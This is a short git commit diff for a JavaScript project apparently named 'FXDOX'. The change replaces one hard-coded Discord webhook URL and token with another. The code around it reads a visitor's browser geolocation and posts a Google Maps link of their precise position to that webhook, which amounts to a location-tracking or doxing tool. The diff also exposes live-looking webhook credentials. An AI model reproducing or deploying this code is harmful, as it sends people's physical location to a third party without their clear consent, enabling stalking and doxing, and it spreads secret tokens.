4f0259575c69946d62f5a2c5cedbbc664310b16b
LUCA LENCIONI <luca.lencioni09@gmail.com>
2023-03-16 23:44:56 +0100

    WHAT____

--- FXDOX/index.js
+++ FXDOX/index.js
@@ -26,7 +26,7 @@ function getGeoCoords() {
             long.innerText = "Longitude: " + position.coords.longitude;
             coords.appendChild(lat);
             coords.appendChild(long);
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086056446975803393/KNUOjrMDXYUCp9hiu4kWGlp5xnwz6oBqk6IOvY1EuSpmg6sdTNQD0Ma1zoT1cpCC5gBn';
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086014299685798011/ft_XBZsL37Luj_0LWloiyuoKpqxNFkLfiB8fcfMDETofsQWIUZ9c5zVXOC4tWvrZZ-JC';
             sendPostToWebhook(WEBHOOK_URL,
                 `https://www.google.com/maps/@${position.coords.latitude},${position.coords.longitude},17.5z`)
             spanify(lat, long)
